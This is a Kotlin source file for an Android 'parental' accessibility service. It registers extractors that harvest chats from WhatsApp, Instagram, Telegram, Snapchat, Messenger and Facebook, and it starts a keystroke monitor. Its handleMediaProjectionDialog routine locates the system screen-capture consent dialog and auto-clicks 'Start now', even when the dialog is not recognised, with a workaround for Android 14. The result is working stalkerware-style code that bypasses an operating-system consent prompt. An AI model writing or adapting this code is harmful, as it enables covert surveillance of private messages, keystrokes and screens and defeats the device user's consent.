package nexus.android.child.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import nexus.android.child.components.chat.ChatMonitor
import nexus.android.child.components.chat.FacebookExtractor
import nexus.android.child.components.chat.InstagramExtractor
import nexus.android.child.components.chat.MessengerExtractor
import nexus.android.child.components.chat.SnapchatExtractor
import nexus.android.child.components.chat.TelegramExtractor
import nexus.android.child.components.chat.WhatsAppExtractor
import nexus.android.child.components.screen.MediaProjectionAutoClickHelper
import nexus.android.child.utils.AccessibilityState

/**
 * ParentalAccessibilityService
 *
 * - Initializes ChatMonitor and registers per-app extractors on service connect.
 * - Forwards AccessibilityEvents to ChatMonitor (keeps main thread light).
 * - Shuts down ChatMonitor on unbind/destroy.
 *
 * IMPORTANT: This service must NOT perform heavy extraction inside onAccessibilityEvent().
 * ChatMonitor offloads the heavy work to a background coroutine dispatcher.
 */
class ParentalAccessibilityService : AccessibilityService() {

    @Suppress("PrivatePropertyName")
    private val TAG = "ParentalA11y"
    
    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastMediaProjectionAttemptMs = 0L
    private val MEDIA_PROJECTION_COOLDOWN_MS = 500L // Reduced cooldown for faster response

    override fun onServiceConnected() {
        super.onServiceConnected()

        // update basic state counters / heartbeat
        AccessibilityState.isBound.set(true)
        AccessibilityState.onServiceConnectedCount.incrementAndGet()
        AccessibilityState.lastConnectedAtMs.set(System.currentTimeMillis())
        AccessibilityState.lastHeartbeatAtMs.set(System.currentTimeMillis())
        Log.d(TAG, "Service connected")

        // Configure robust defaults for breadth of apps
        serviceInfo = (serviceInfo ?: AccessibilityServiceInfo()).apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = (
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                            AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                    )
            // Reduced notification timeout for faster MediaProjection dialog detection
            notificationTimeout = 10 // 10ms for near-instant response
            @Suppress("ControlFlowWithEmptyBody")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // future: add advanced flags if needed
            }
        }

        // Initialize ChatMonitor (singleton) and register per-app extractors.
        // ChatMonitor will handle heavy extraction off the Accessibility thread.
        try {
            ChatMonitor.init(applicationContext)

            // Register the extractors you implemented. If an extractor is missing,
            // ChatMonitor falls back to the generic extractor.
            ChatMonitor.instance.registerExtractor("com.whatsapp", WhatsAppExtractor())
            ChatMonitor.instance.registerExtractor("com.instagram.android", InstagramExtractor())
            ChatMonitor.instance.registerExtractor("org.telegram.messenger", TelegramExtractor())
            ChatMonitor.instance.registerExtractor("com.snapchat.android", SnapchatExtractor())
            ChatMonitor.instance.registerExtractor("com.facebook.orca", MessengerExtractor())
            ChatMonitor.instance.registerExtractor("com.facebook.katana", FacebookExtractor())

            Log.d(TAG, "ChatMonitor initialized and extractors registered")

        } catch (t: Throwable) {
            Log.e(TAG, "Error initializing ChatMonitor", t)
        }
        
        // Initialize KeyboardMonitor
        try {
            nexus.android.child.components.keyboard.KeyboardMonitor.init(applicationContext)
            Log.d(TAG, "KeyboardMonitor initialized")
        } catch (t: Throwable) {
            Log.e(TAG, "Error initializing KeyboardMonitor", t)
        }
    }

    override fun onUnbind(intent: Intent?): Boolean {
        AccessibilityState.isBound.set(false)
        AccessibilityState.onUnbindCount.incrementAndGet()
        Log.w(TAG, "Service unbound - shutting down ChatMonitor")

        // Best-effort shutdown of ChatMonitor (cancels coroutines); ChatMonitor.init() will
        // recreate on next connection if needed.
        try {
            ChatMonitor.instance.shutdown()
        } catch (t: Throwable) {
            Log.w(TAG, "ChatMonitor shutdown error", t)
        }
        
        // Shutdown KeyboardMonitor
        try {
            nexus.android.child.components.keyboard.KeyboardMonitor.instance.shutdown()
        } catch (t: Throwable) {
            Log.w(TAG, "KeyboardMonitor shutdown error", t)
        }

        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "Service destroyed - cleaning up")
        try {
            ChatMonitor.instance.shutdown()
        } catch (_: Throwable) {
            // ignore - defensive
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Service interrupted")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Extremely lightweight: update heartbeat + forward the event to monitors.
        // Do NOT do heavy traversal or blocking work here.
        try {
            AccessibilityState.lastHeartbeatAtMs.set(System.currentTimeMillis())

            if (event == null) return

            // Handle MediaProjection permission dialog auto-click
            handleMediaProjectionDialog(event)

            // Forward the event to ChatMonitor for async processing.
            // ChatMonitor will filter and handle only the event types it cares about.
            try {
                ChatMonitor.instance.onAccessibilityEvent(event)
            } catch (t: Throwable) {
                // If ChatMonitor isn't initialized for some reason, log and continue.
                Log.e(TAG, "Error forwarding event to ChatMonitor", t)
            }
            
            // Forward the event to KeyboardMonitor for async processing.
            try {
                nexus.android.child.components.keyboard.KeyboardMonitor.instance.onAccessibilityEvent(event)
            } catch (t: Throwable) {
                Log.e(TAG, "Error forwarding event to KeyboardMonitor", t)
            }
        } catch (t: Throwable) {
            AccessibilityState.eventExceptionCount.incrementAndGet()
            Log.e(TAG, "Event handling error", t)
        }
    }
    
    /**
     * Handle MediaProjection permission dialog auto-click
     * 
     * SECURITY:
     * - Only clicks if MediaProjectionAutoClickHelper.isAutoClickEnabled() returns true
     * - This ensures we only click on dialogs triggered by our TransparentMediaProjectionActivity
     * - Prevents clicking on unrelated system dialogs or other apps' MediaProjection requests
     * 
     * Detects when system shows MediaProjection permission dialog and auto-clicks "Start now"
     * Uses cooldown to prevent rapid retries
     */
    private fun handleMediaProjectionDialog(event: AccessibilityEvent) {
        try {
            // Only handle window state changes and content changes
            if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                return
            }
            
            // CRITICAL: Check if auto-click is enabled (gating mechanism)
            // This prevents clicking on unrelated dialogs
            if (!MediaProjectionAutoClickHelper.isAutoClickEnabled()) {
                return
            }
            
            // Check if this is MediaProjection dialog
            val packageName = event.packageName?.toString()
            val windowTitle = event.source?.window?.title?.toString()
            
            // Log for debugging
            Log.d(TAG, "🔍 Window event - package: $packageName, title: $windowTitle")
            
            // Try to detect MediaProjection dialog, but if auto-click is enabled,
            // we trust that it was triggered by our TransparentMediaProjectionActivity
            val isMediaProjectionDialog = MediaProjectionAutoClickHelper.isMediaProjectionDialog(packageName, windowTitle)
            
            // If not detected as MediaProjection dialog but auto-click is enabled,
            // still try (since auto-click has 2s timeout, it's safe)
            if (!isMediaProjectionDialog) {
                Log.d(TAG, "⚠️ Not detected as MediaProjection dialog, but auto-click enabled - will try anyway")
            }
            
            // Apply cooldown to prevent rapid retries
            val now = System.currentTimeMillis()
            if (now - lastMediaProjectionAttemptMs < MEDIA_PROJECTION_COOLDOWN_MS) {
                return
            }
            lastMediaProjectionAttemptMs = now
            
            Log.d(TAG, "🎯 MediaProjection dialog detected (auto-click enabled)")
            
            // Minimal delay for dialog rendering - optimized for speed
            mainHandler.postDelayed({
                try {
                    // ANDROID 14 WORKAROUND: Use getWindows() to find dialog window
                    // The "Start now" button is hidden from rootInActiveWindow but visible in dialog window
                    val windows = windows
                    var dialogRoot: AccessibilityNodeInfo? = null
                    
                    if (windows != null && windows.isNotEmpty()) {
                        Log.d(TAG, "🔍 Found ${windows.size} windows, searching for dialog...")
                        
                        // Try all windows, not just the first one
                        for (window in windows) {
                            val windowType = window.type
                            val windowRoot = window.root
                            
                            if (windowRoot != null) {
                                Log.d(TAG, "  Window: type=$windowType, title=${window.title}, layer=${window.layer}, childCount=${windowRoot.childCount}")
                                
                                // Try windows with children first (dialog should have content)
                                if (windowRoot.childCount > 0) {
                                    dialogRoot = windowRoot
                                    Log.d(TAG, "✅ Using window with ${windowRoot.childCount} children as dialog root")
                                    break
                                }
                            }
                        }
                        
                        // If no window with children found, try any system/application window
                        if (dialogRoot == null) {
                            for (window in windows) {
                                val windowType = window.type
                                val windowRoot = window.root
                                
                                if (windowRoot != null && (windowType == AccessibilityWindowInfo.TYPE_APPLICATION || 
                                    windowType == AccessibilityWindowInfo.TYPE_SYSTEM)) {
                                    dialogRoot = windowRoot
                                    Log.d(TAG, "⚠️ Using window type=$windowType as fallback (no children)")
                                    break
                                }
                            }
                        }
                    }
                    
                    // Fallback to rootInActiveWindow if no dialog window found
                    val rootNode = dialogRoot ?: rootInActiveWindow
                    
                    if (rootNode != null) {
                        val clicked = MediaProjectionAutoClickHelper.tryAutoClick(rootNode, this)
                        if (clicked) {
                            Log.d(TAG, "✅ MediaProjection dialog auto-clicked")
                        } else {
                            Log.w(TAG, "⚠️ Failed to auto-click MediaProjection dialog")
                        }
                    } else {
                        Log.w(TAG, "⚠️ No root node available")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "⚠️ Error auto-clicking MediaProjection dialog", e)
                }
            }, 100) // 100ms delay - faster to prevent token expiration
            
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Error handling MediaProjection dialog", e)
        }
    }
}
